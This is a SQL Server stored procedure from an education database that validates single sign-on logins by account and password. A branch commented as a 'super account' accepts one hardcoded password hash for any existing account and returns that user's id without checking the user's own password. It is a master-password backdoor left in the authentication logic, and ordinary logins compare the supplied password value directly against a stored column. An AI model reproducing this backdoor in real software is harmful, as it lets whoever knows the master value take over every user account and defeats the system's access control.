USE [edu_jn]
GO
/****** Object:  StoredProcedure [dbo].[ValidateUserExists]    Script Date: 2014/11/24 23:05:18 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO














-- =============================================
-- Author:		liaoxin
-- Create date: 2011-06-20
-- Description:	单点登陆判断用户是否存在
-- =============================================
create PROCEDURE [dbo].[ValidateUserExists]
@account varchar(50),
@pwd varchar(50)
AS
BEGIN
   DECLARE @userid int,@existsaccount int,@returnvalue int
   SELECT @existsaccount=COUNT(1) FROM [group_user] where account=@account and deletetag=1
   
   IF(@existsaccount>0)
   BEGIN
			declare @usertype int
            DECLARE @bloguserid int
            declare @nickname nvarchar(50)
   --超级帐号
	IF(@pwd='B5EB6CE0935E1564D853EE8B467AA356DBA3E516')
     BEGIN
     SELECT @userid=userid FROM [group_user] where account=@account  AND  deletetag=1
     IF(@userid>0)
     BEGIN
			SET @returnvalue=@userid			
     END
     END
   ELSE
    BEGIN
     SELECT @userid=userid From [group_user] WHERE account=@account and [pwd]=@pwd AND deletetag=1

     IF(@userid>0)
     BEGIN
			SET @returnvalue=@userid
            
     END
     ELSE
     --密码错误
     BEGIN
     set @returnvalue=-1
     END
    
    END
   END
   
   ELSE
   --用户名不存在
   BEGIN
    set @returnvalue=-2
   END
   
   RETURN @returnvalue


END







GO
